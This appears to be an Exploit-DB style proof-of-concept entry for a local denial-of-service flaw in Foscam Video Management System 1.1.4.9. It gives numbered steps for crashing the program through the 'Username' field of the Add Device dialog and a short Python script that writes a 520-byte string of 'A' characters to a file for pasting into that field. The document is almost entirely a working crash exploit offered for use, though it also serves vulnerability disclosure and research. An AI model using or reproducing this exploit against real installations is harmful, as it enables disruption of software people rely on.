# Exploit Title: Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC)
# Author: chuyreds
# Discovery Date: 2019-11-16
# Vendor Homepage: https://www.foscam.es/
# Software Link : https://www.foscam.es/descarga/FoscamVMS_1.1.4.9.zip
# Tested Version: 1.1.4.9
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es

# Steps to Produce the Crash: 
# 1.- Run python code : python foscam-vms-uid-dos.py
# 2.- Open FoscamVMS1.1.4.9.txt and copy its content to clipboard
# 3.- Open FoscamVMS
# 4.- Go to Add Device
# 5.- Choose device type "NVR"/"IPC"
# 6.- Copy the content of the file into Username
# 7.- Click on Login Check
# 8.- Crashed
 
buffer = "\x41" * 520
f = open ("FoscamVMS_1.1.4.9.txt", "w")
f.write(buffer)
f.close()